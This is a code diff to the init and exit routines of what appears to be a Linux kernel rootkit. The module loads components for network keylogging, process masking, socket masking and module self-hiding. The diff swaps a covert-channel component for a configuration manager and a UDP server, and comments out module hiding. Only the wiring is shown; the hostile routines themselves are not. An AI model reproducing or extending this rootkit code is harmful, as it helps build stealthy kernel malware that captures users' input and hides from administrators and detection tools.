@@ -30,7 +30,8 @@
 #include "network_keylogging.h"	/* Needed for ... */
 #include "process_masking.h"	/* Needed for ... */
 #include "socket_masking.h"		/* Needed for ... */
-#include "covert_channel.h"		/* Needed for ... */
+#include "conf_manager.h"		/* Needed for ... */
+#include "udp_server.h"			/* Needed for ... */
 
 
 MODULE_LICENSE("GPL");
@@ -93,15 +94,17 @@ static int __init core_start(void)
 	enable_write_protect_mode();
 
 	//TODO: check return values
-	module_masking_init(DEBUG_MODE_IS_ON);
+	//module_masking_init(DEBUG_MODE_IS_ON);
 	network_keylogging_init(DEBUG_MODE_IS_ON);
 	process_masking_init(DEBUG_MODE_IS_ON);
 	socket_masking_init(DEBUG_MODE_IS_ON);
-	covert_channel_init(DEBUG_MODE_IS_ON);
+	conf_manager_init(DEBUG_MODE_IS_ON);
+	udp_server_init(DEBUG_MODE_IS_ON);
 
 	DEBUG_PRINT("successfully inserted");
 
 	/* A non 0 return value means init_module failed; module can't be loaded */
+
 	return 0;
 }
 
@@ -120,11 +123,12 @@ static void __exit core_end(void)
 
 	enable_write_protect_mode();
 
-	covert_channel_exit();
+	udp_server_exit();
+	conf_manager_exit();
 	socket_masking_exit();
 	process_masking_exit();
 	network_keylogging_exit();
-	module_masking_exit();
+	//module_masking_exit();
 
 	DEBUG_PRINT("successfully removed");
 
